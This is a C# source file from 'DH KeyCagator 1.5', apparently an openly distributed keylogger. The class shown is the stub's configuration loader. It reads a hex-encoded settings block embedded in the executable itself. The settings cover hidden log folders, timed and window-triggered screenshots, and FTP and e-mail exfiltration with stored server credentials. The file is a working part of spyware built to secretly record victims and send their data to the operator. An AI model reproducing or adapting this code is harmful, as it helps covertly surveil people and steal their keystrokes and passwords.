// DH KeyCagator 1.5
// Class to load configuration of Stub
// (C) Doddy Hackman 2014

using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace stub
{
    class load_config
    {
        string keylogger_online_config = "";
        string password_config = "";
        string opcion_directorio_especial_config = "";
        string directorio_especial_config = "";
        string opcion_directorio_normal_config = "";
        string directorio_normal_config = "";
        string carpeta_config = "";
        string opcion_capturar_pantalla_normal_config = "";
        string tiempo_capture_pantalla_normal_config = "";
        string opcion_capturar_pantalla_especial_config = "";
        string regex_for_windows_config = "";
        string opcion_ftp_sender_config = "";
        string tiempo_ftp_sender_config = "";
        string ftp_host_config = "";
        string ftp_user_config = "";
        string ftp_pass_config = "";
        string ftp_path_config = "";
        string opcion_sender_mail_config = "";
        string tiempo_sender_mail_config = "";
        string opcion_sender_mail_only_config = "";
        string mail_user_config = "";
        string mail_pass_config = "";
        string mail_to_config = "";

        public string keylogger_online
        {
            set { keylogger_online_config = value; }
            get { return keylogger_online_config;  }
        }

        public string password
        {
            set { password_config = value; }
            get { return password_config; }
        }

        public string opcion_directorio_especial
        {
            set { opcion_directorio_especial_config = value; }
            get { return opcion_directorio_especial_config; }
        }

        public string directorio_especial
        {
            set { directorio_especial_config = value; }
            get { return directorio_especial_config; }
        }

        public string opcion_directorio_normal
        {
            set { opcion_directorio_normal_config = value; }
            get { return opcion_directorio_normal_config; }
        }

        public string directorio_normal
        {
            set { directorio_normal_config = value; }
            get { return directorio_normal_config; }
        }

        public string carpeta
        {
            set { carpeta_config = value; }
            get { return carpeta_config; }
        }

        public string opcion_capturar_pantalla_normal
        {
            set { opcion_capturar_pantalla_normal_config = value; }
            get { return opcion_capturar_pantalla_normal_config; }
        }

        public string tiempo_capture_pantalla_normal
        {
            set { tiempo_capture_pantalla_normal_config = value; }
            get { return tiempo_capture_pantalla_normal_config; }
        }

        public string opcion_capturar_pantalla_especial
        {
            set { opcion_capturar_pantalla_especial_config = value; }
            get { return opcion_capturar_pantalla_especial_config; }
        }

        public string regex_for_windows
        {
            set { regex_for_windows_config = value; }
            get { return regex_for_windows_config; }
        }

        public string opcion_ftp_sender
        {
            set { opcion_ftp_sender_config = value; }
            get { return opcion_ftp_sender_config; }
        }

        public string tiempo_ftp_sender
        {
            set { tiempo_ftp_sender_config = value; }
            get { return tiempo_ftp_sender_config; } 
        }

        public string ftp_host
        {
            set { ftp_host_config = value; }
            get { return ftp_host_config; }
        }

        public string ftp_user
        {
            set { ftp_user_config = value; }
            get { return ftp_user_config; }
        }

        public string ftp_pass
        {
            set { ftp_pass_config = value; }
            get { return ftp_pass_config; }
        }

        public string ftp_path
        {
            set { ftp_path_config = value; }
            get { return ftp_path_config; }
        }

        public string opcion_sender_mail
        {
            set { opcion_sender_mail_config = value; }
            get { return opcion_sender_mail_config; }
        }

        public string tiempo_sender_mail
        {
            set { tiempo_sender_mail_config = value; }
            get { return tiempo_sender_mail_config; }
        }

        public string opcion_sender_mail_only
        {
            set { opcion_sender_mail_only_config = value; }
            get { return opcion_sender_mail_only_config; }
        }

        public string mail_user
        {
            set { mail_user_config = value; }
            get { return mail_user_config; }
        }

        public string mail_pass
        {
            set { mail_pass_config = value; }
            get { return mail_pass_config; }
        }

        public string mail_to
        {
            set { mail_to_config = value; }
            get { return mail_to_config; }
        }

        public string hexencode(string texto)
        {
            string resultado = "";

            byte[] enc = Encoding.Default.GetBytes(texto);
            resultado = BitConverter.ToString(enc);
            resultado = resultado.Replace("-", "");
            return "0x" + resultado;
        }

        public string hexdecode(string texto)
        {

            // Based on : http://snipplr.com/view/36461/string-to-hex----hex-to-string-convert/
            // Thanks to emregulcan

            string valor = texto.Replace("0x", "");
            string retorno = "";

            while (valor.Length > 0)
            {
                retorno = retorno + System.Convert.ToChar(System.Convert.ToUInt32(valor.Substring(0, 2), 16));
                valor = valor.Substring(2, valor.Length - 2);
            }

            return retorno.ToString();
        }

        public load_config() {

            string keylogger_online_config = "";
            string password_config = "";
            string opcion_directorio_especial_config = "";
            string directorio_especial_config = "";
            string opcion_directorio_normal_config = "";
            string directorio_normal_config = "";
            string carpeta_config = "";
            string opcion_capturar_pantalla_normal_config = "";
            string tiempo_capture_pantalla_normal_config = "";
            string opcion_capturar_pantalla_especial_config = "";
            string regex_for_windows_config = "";
            string opcion_ftp_sender_config = "";
            string tiempo_ftp_sender_config = "";
            string ftp_host_config = "";
            string ftp_user_config = "";
            string ftp_pass_config = "";
            string ftp_path_config = "";
            string opcion_sender_mail_config = "";
            string tiempo_sender_mail_config = "";
            string opcion_sender_mail_only_config = "";
            string mail_user_config = "";
            string mail_pass_config = "";
            string mail_to_config = "";

            string keylogger_online = "";
            string password = "";
            string opcion_directorio_especial = "";
            string directorio_especial = "";
            string opcion_directorio_normal = "";
            string directorio_normal = "";
            string carpeta = "";
            string opcion_capturar_pantalla_normal = "";
            string tiempo_capture_pantalla_normal = "";
            string opcion_capturar_pantalla_especial = "";
            string regex_for_windows = "";
            string opcion_ftp_sender = "";
            string tiempo_ftp_sender = "";
            string ftp_host = "";
            string ftp_user = "";
            string ftp_pass = "";
            string ftp_path = "";
            string opcion_sender_mail = "";
            string tiempo_sender_mail = "";
            string opcion_sender_mail_only = "";
            string mail_user = "";
            string mail_pass = "";
            string mail_to = "";
        }

        public void load_data()
        {
            StreamReader viendo = new StreamReader(Application.ExecutablePath);
            string contenido = viendo.ReadToEnd();
            Match regex = Regex.Match(contenido, "-63686175-(.*?)-63686175-", RegexOptions.IgnoreCase);

            if (regex.Success)
            {
                string comandos = regex.Groups[1].Value;
                if (comandos != "" || comandos != " ")
                {

                    keylogger_online_config = "1";

                    string leyendo = hexdecode(comandos);
                    regex = Regex.Match(leyendo, "-password-(.*)-password-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        password_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_directorio_especial-(.*)-opcion_directorio_especial-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_directorio_especial_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-directorio_especial-(.*)-directorio_especial-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        directorio_especial_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_directorio_normal-(.*)-opcion_directorio_normal-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_directorio_normal_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-directorio_normal-(.*)-directorio_normal-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        directorio_normal_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-carpeta-(.*)-carpeta-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        carpeta_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_capturar_pantalla_normal-(.*)-opcion_capturar_pantalla_normal-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_capturar_pantalla_normal_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-tiempo_capture_pantalla_normal-(.*)-tiempo_capture_pantalla_normal-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        tiempo_capture_pantalla_normal_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_capturar_pantalla_especial-(.*)-opcion_capturar_pantalla_especial-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_capturar_pantalla_especial_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-regex_for_windows-(.*)-regex_for_windows-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        regex_for_windows_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_ftp_sender-(.*)-opcion_ftp_sender-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_ftp_sender_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-tiempo_ftp_sender-(.*)-tiempo_ftp_sender-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        tiempo_ftp_sender_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-ftp_host-(.*)-ftp_host-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        ftp_host_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-ftp_user-(.*)-ftp_user-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        ftp_user_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-ftp_pass-(.*)-ftp_pass-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        ftp_pass_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-ftp_path-(.*)-ftp_path-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        ftp_path_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_sender_mail-(.*)-opcion_sender_mail-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_sender_mail_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-tiempo_sender_mail-(.*)-tiempo_sender_mail-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        tiempo_sender_mail_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-opcion_sender_mail_only-(.*)-opcion_sender_mail_only-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        opcion_sender_mail_only_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-mail_user-(.*)-mail_user-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        mail_user_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-mail_pass-(.*)-mail_pass-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        mail_pass_config = regex.Groups[1].Value;
                    }

                    regex = Regex.Match(leyendo, "-mail_to-(.*)-mail_to-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        mail_to_config = regex.Groups[1].Value;
                    }
                }
                else
                {
                    keylogger_online_config = "0";
                }
            }
        }

        public string get_data()
        {
            string lista = "";

            lista = "[+] Keylogger Online : " + keylogger_online_config + "\n" +
            "[+] Password : " + password_config + "\n" +
            "[+] Opcion directory special : " + opcion_directorio_especial_config + "\n" +
            "[+] Directory Special : " + directorio_especial_config + "\n" +
            "[+] Opcion directory normal : " + opcion_directorio_normal_config + "\n" +
            "[+] Directory normal : " + directorio_normal_config + "\n" +
            "[+] Folder : " + carpeta_config + "\n" +
            "[+] Option screenshot normal : " + opcion_capturar_pantalla_normal_config + "\n" +
            "[+] Time capture screen : " + tiempo_capture_pantalla_normal_config + "\n" +
            "[+] Option screenshot special : " + opcion_capturar_pantalla_especial_config + "\n" +
            "[+] Regex for screeshot : " + regex_for_windows_config + "\n" +
            "[+] Option ftp sender : " + opcion_ftp_sender_config + "\n" +
            "[+] Time ftp sender : " + tiempo_ftp_sender_config + "\n" +
            "[+] FTP Host : " + ftp_host_config + "\n" +
            "[+] FTP User : " + ftp_user_config + "\n" +
            "[+] FTP Pass : " + ftp_pass_config + "\n" +
            "[+] FTP Path : " + ftp_path_config + "\n" +
            "[+] Option sender mail : " + opcion_sender_mail_config + "\n" +
            "[+] Time sender mail : " + tiempo_sender_mail_config + "\n" +
            "[+] Option sender mail only : " + opcion_sender_mail_only_config + "\n" +
            "[+] Mail user : " + mail_user_config + "\n" +
            "[+] Mail pass : " + mail_pass_config + "\n" +
            "[+] Mail to : " + mail_to_config + "\n";

            return lista;

        }

    }
}

// The End ? 